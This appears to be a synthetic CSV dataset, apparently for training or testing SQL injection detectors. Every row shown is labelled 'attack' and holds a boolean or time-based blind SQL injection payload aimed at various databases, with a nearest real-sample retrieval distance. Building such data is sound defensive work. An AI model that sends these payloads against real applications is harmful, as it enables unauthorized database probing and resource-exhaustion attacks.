id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000282,attack,boolean,-1375'   )    )     )   or   (  1226  =  9648  )  *9648 and    (    (     (  'kfoy' like 'kfoy,nearest_attack_euclidean,R000377,6.767543718977062
CTGAN_000283,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001386,5.315576629025322
CTGAN_000284,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R001313,6.436521843195422
CTGAN_000285,attack,boolean,"1""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000424,5.547818438180531
CTGAN_000286,attack,boolean,"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",nearest_attack_euclidean,R000534,6.155642396081102
CTGAN_000287,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000866,6.404991400462131
CTGAN_000288,attack,boolean,"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000486,7.104040787936745
CTGAN_000289,attack,boolean,"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000667,5.1382195548218785
CTGAN_000290,attack,boolean,"-4541""   )    )    or make_set  (  4821  =  5233,5233  )   and    (    (   ""xfex""  =  ""xfex",nearest_attack_euclidean,R000460,5.317084940384053
CTGAN_000291,attack,boolean,-3559'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R001381,3.8125684653536314
CTGAN_000292,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000221,4.399799588305755
CTGAN_000293,attack,boolean,"-9289   )    )    or make_set  (  5101  =  9919,9919  )   and    (    (   8977  =  8977",nearest_attack_euclidean,R000485,5.7022859449294945
CTGAN_000294,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",nearest_attack_euclidean,R000902,5.077925387173694
CTGAN_000295,attack,boolean,"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001514,5.209152406491569
CTGAN_000296,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001300,5.795460839842441
CTGAN_000297,attack,boolean,"1'||  (  select 'flre' where 8250  =  8250 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R001415,6.392257530428001
CTGAN_000298,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,6.486345653879433
CTGAN_000299,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000669,7.326226054319279
CTGAN_000300,attack,boolean,"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'wmrr' like 'wmrr",nearest_attack_euclidean,R000232,5.12530856829181
CTGAN_000301,attack,boolean,"1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000193,5.472387301347679
CTGAN_000302,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001138,5.755173284319206
CTGAN_000303,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",nearest_attack_euclidean,R001297,4.398523939042367
CTGAN_000304,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R001388,5.808855836938633
CTGAN_000305,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001480,7.56974954436137
CTGAN_000306,attack,boolean,"1%""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000608,6.531090849249256
CTGAN_000307,attack,boolean,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000431,5.531809979882936
CTGAN_000308,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R001541,4.904201720124093
CTGAN_000309,attack,boolean,"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000097,5.1621560992424085
CTGAN_000310,attack,boolean,"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",nearest_attack_euclidean,R000601,4.414797498394637
CTGAN_000311,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000295,4.980609827702031
CTGAN_000312,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'iqvg'  =  'iqvg",nearest_attack_euclidean,R000287,7.023957215549943
CTGAN_000313,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000145,6.377493423458994
CTGAN_000314,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000688,6.454580579058035
CTGAN_000315,attack,boolean,"-6948""   )    )    as ojjl where 1300  =  1300 or 6872  =  6872--",nearest_attack_euclidean,R000571,8.065866153508242
CTGAN_000316,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001157,4.763521953381186
CTGAN_000317,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R001388,4.551562726309394
CTGAN_000318,attack,boolean,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'dfsj'  =  'dfsj",nearest_attack_euclidean,R000970,6.2695182545664
CTGAN_000319,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001422,6.916938064314988
CTGAN_000320,attack,boolean,"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",nearest_attack_euclidean,R001560,8.403824425124132
CTGAN_000321,attack,boolean,1' rlike   (  select   (  case when   (  6855  =  1056  )   then 1 else 0x28 end   )    )    and 'pmrz' like 'pmrz,nearest_attack_euclidean,R000886,5.648111224028237
CTGAN_000322,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000472,5.519044401631544
CTGAN_000323,attack,boolean,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000194,5.72568125687925
CTGAN_000324,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,nearest_attack_euclidean,R000998,6.748476111309251
CTGAN_000325,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   7749  =  7749",nearest_attack_euclidean,R000637,5.924477921543702
CTGAN_000326,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001300,5.500209598678277
CTGAN_000327,attack,boolean,"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",nearest_attack_euclidean,R001416,5.928200548173617
CTGAN_000328,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",nearest_attack_euclidean,R000497,4.89517097759277
CTGAN_000329,attack,boolean,1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R001103,4.673445655765065
CTGAN_000330,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000244,5.132515187060572
CTGAN_000331,attack,boolean,"1%' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000759,6.144969548618115
CTGAN_000332,attack,boolean,"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb",nearest_attack_euclidean,R000410,4.483403041943927
CTGAN_000333,attack,boolean,"1'+  (  select afst where 7454  =  7454 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",nearest_attack_euclidean,R000137,8.414599708163866
CTGAN_000334,attack,boolean,"1'+  (  select 'igoi' where 7823  =  7823 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000218,7.317731151154109
CTGAN_000335,attack,boolean,"1   )    )    as rbae where 2049  =  2049 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000986,5.760596967924189
CTGAN_000336,attack,boolean,"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000246,7.314607946463305
CTGAN_000337,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R001221,7.549703115410952
CTGAN_000338,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R000255,5.919659282629304
CTGAN_000339,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001267,7.008912192894602
CTGAN_000340,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",nearest_attack_euclidean,R000944,5.231113322978252
CTGAN_000341,attack,boolean,"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000782,5.155191256114837
CTGAN_000342,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   7749  =  7749",nearest_attack_euclidean,R000637,7.900866594665676
CTGAN_000343,attack,boolean,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""cdai""  =  ""cdai",nearest_attack_euclidean,R001453,3.8179214063742064
CTGAN_000344,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",nearest_attack_euclidean,R000378,4.614810701504938
CTGAN_000345,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R001326,6.621211062310391
CTGAN_000346,attack,boolean,"-5529"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",nearest_attack_euclidean,R001349,6.709858856243241
CTGAN_000347,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey",nearest_attack_euclidean,R000461,6.643106457291472
CTGAN_000348,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000310,3.5039869203758554
CTGAN_000349,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",nearest_attack_euclidean,R000721,5.741243530187476
CTGAN_000350,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000983,6.738887985801894
CTGAN_000351,attack,boolean,"1'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001396,4.579572907823202
CTGAN_000352,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",nearest_attack_euclidean,R000378,6.140898893265727
CTGAN_000353,attack,boolean,"1'+  (  select tvpj where 7058  =  7058 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",nearest_attack_euclidean,R001317,7.153187411911145
CTGAN_000354,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",nearest_attack_euclidean,R000364,4.793833063628769
CTGAN_000355,attack,boolean,"1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000924,5.09030976602842
CTGAN_000356,attack,boolean,"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000727,5.450993931550161
CTGAN_000357,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R001388,5.798363682990237
CTGAN_000358,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",nearest_attack_euclidean,R000902,5.4694405722445225
CTGAN_000359,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",nearest_attack_euclidean,R001107,5.159655499262285
CTGAN_000360,attack,boolean,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",nearest_attack_euclidean,R001229,6.31350108704837
CTGAN_000361,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",nearest_attack_euclidean,R000482,4.392947998525739
CTGAN_000362,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000142,3.5165653117969944
CTGAN_000363,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,4.146833560789437
CTGAN_000364,attack,boolean,-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,nearest_attack_euclidean,R000404,6.9256692993762385
CTGAN_000365,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000575,5.921179281299435
CTGAN_000366,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000623,5.448496598844434
CTGAN_000367,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R001031,6.306492353441364
CTGAN_000368,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000403,6.35417129496453
CTGAN_000369,attack,boolean,-1375'   )    )     )   or   (  1226  =  9648  )  *9648 and    (    (     (  'kfoy' like 'kfoy,nearest_attack_euclidean,R000377,5.028458045669289
CTGAN_000370,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",nearest_attack_euclidean,R000744,5.1394919549335
CTGAN_000371,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000330,6.019248473649865
CTGAN_000372,attack,boolean,"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,nearest_attack_euclidean,R000535,6.035340235348597
CTGAN_000373,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000887,5.89690048695299
CTGAN_000374,attack,boolean,"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R001555,6.297593092500464
CTGAN_000375,attack,boolean,"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf",nearest_attack_euclidean,R000541,6.846086874206987
CTGAN_000376,attack,boolean,"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000321,6.439268319750071
CTGAN_000377,attack,boolean,"1   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  3036  =  3036",nearest_attack_euclidean,R001319,6.714596313850945
CTGAN_000378,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001157,5.853366087403248
CTGAN_000379,attack,boolean,"-9289   )    )    or make_set  (  5101  =  9919,9919  )   and    (    (   8977  =  8977",nearest_attack_euclidean,R000485,8.461702503240934
CTGAN_000380,attack,boolean,"1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001409,6.476242425467592
CTGAN_000381,attack,boolean,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",nearest_attack_euclidean,R000868,6.34503450387172
CTGAN_000382,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   7749  =  7749",nearest_attack_euclidean,R000637,6.31696733375399
CTGAN_000383,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",nearest_attack_euclidean,R000921,5.319585555038913
CTGAN_000384,attack,boolean,"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450",nearest_attack_euclidean,R000557,7.566196121067667
CTGAN_000385,attack,boolean,"1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000552,5.623819439861923
CTGAN_000386,attack,boolean,"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",nearest_attack_euclidean,R000582,4.762548490821014
CTGAN_000387,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001480,5.447681118764851
CTGAN_000388,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",nearest_attack_euclidean,R001148,7.784653646320566
CTGAN_000389,attack,boolean,"1%'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000479,6.9485456737513385
CTGAN_000390,attack,boolean,"1   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  3036  =  3036",nearest_attack_euclidean,R001319,5.019288941094739
CTGAN_000391,attack,boolean,-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok,nearest_attack_euclidean,R000148,5.87684995974588
CTGAN_000392,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000887,6.218977473435173
CTGAN_000393,attack,boolean,"1'+  (  select 'opqr' where 2442  =  2442 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000428,6.482175415892052
CTGAN_000394,attack,boolean,"1'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001099,6.0101171396457245
CTGAN_000395,attack,boolean,"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",nearest_attack_euclidean,R001416,5.673433036700767
CTGAN_000396,attack,boolean,"1'||  (  select 'zrea' from dual where 1223  =  1223 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001387,6.177361691197458
CTGAN_000397,attack,boolean,"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001494,5.486220908795744
CTGAN_000398,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- xgyc",nearest_attack_euclidean,R001513,6.009279306963406
CTGAN_000399,attack,boolean,1   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   4279  =  4279,nearest_attack_euclidean,R001017,7.017752030622818
CTGAN_000400,attack,boolean,"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",nearest_attack_euclidean,R000601,6.003240370513104
CTGAN_000401,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000450,5.904157306596895
CTGAN_000402,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001386,6.343941840855942
CTGAN_000403,attack,boolean,"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",nearest_attack_euclidean,R000808,6.211704329681239
CTGAN_000404,attack,boolean,"1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001076,6.087565201738873
CTGAN_000405,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R000729,6.306850663457616
CTGAN_000406,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R000519,5.462199155076867
CTGAN_000407,attack,boolean,"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000486,5.199616396813675
CTGAN_000408,attack,boolean,"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000486,5.561534570962911
CTGAN_000409,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R001053,5.727104389968707
CTGAN_000410,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000755,5.444159674493327
CTGAN_000411,attack,boolean,"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000821,5.511410584094476
CTGAN_000412,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- xgyc",nearest_attack_euclidean,R001513,5.739495793807236
CTGAN_000413,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001157,5.440950785781635
CTGAN_000414,attack,boolean,"1%'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000760,4.444505840137075
CTGAN_000415,attack,boolean,"1'+  (  select lgkd where 7801  =  7801 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R001160,6.149144085552457
CTGAN_000416,attack,boolean,"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",nearest_attack_euclidean,R000375,6.2114523003147815
CTGAN_000417,attack,boolean,"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",nearest_attack_euclidean,R000675,6.010999782754173
CTGAN_000418,attack,boolean,1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000903,4.651682895455597
CTGAN_000419,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",nearest_attack_euclidean,R000364,5.228028185604415
CTGAN_000420,attack,boolean,"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",nearest_attack_euclidean,R000712,6.591367486405641
